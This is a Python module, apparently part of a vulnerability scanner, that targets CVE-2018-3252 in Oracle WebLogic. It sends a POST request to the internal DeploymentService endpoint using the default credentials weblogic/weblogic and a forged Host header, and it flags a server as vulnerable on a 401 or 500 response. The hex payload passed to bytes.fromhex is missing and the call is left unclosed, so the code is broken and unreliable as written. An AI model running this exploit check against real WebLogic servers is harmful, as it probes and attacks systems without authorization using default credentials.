#!/usr/bin/env python3
# _*_ coding:utf-8 _*_
# CVE-2018-3252
# 必须要用户名密码正确才可以验证
# updated 2019/12/05
# by 0xn0ne

from stars import target_type, Star
from utils import http
from multiprocessing.managers import SyncManager
from typing import Any, Dict, List, Mapping, Tuple, Union


# @universe.groups()
class CVE_2018_3252(Star):
    info = {
        'NAME': '',
        'CVE': 'CVE-2018-3252',
        'TAG': []
    }
    type = target_type.MODULE

    def light_up(self, dip, dport, force_ssl=None, *args, **kwargs) -> (bool, dict):
        url = 'http://{}:{}/bea_wls_deployment_internal/DeploymentService'.format(
            dip, dport)
        headers = {'Host': '127.0.0.1:7001', 'wl_request_type': 'data_transfer_request', 'Username': 'weblogic',
                   'Password': 'weblogic'}
        data = bytes.fromhex(

        res, data = http(url, 'POST', headers=headers,
                         data=data, ssl=force_ssl)
        if res != None and ((res.status_code == 401) or (res.status_code == 500)):
            return True, {'msg': 'finish.'}
        return False, {'msg': 'finish.'}


def run(queue: SyncManager.Queue, data: Dict):
    obj = CVE_2018_3252()
    result = {
        'IP': data['IP'],
        'PORT': data['PORT'],
        'NAME': obj.info['CVE'] if obj.info['CVE'] else obj.info['NAME'],
        'MSG': '',
        'STATE': False
    }
    result['STATE'], result['MSG'] = obj.light_and_msg(
        data['IP'], data['PORT'], data['IS_SSL'])

    queue.put(result)
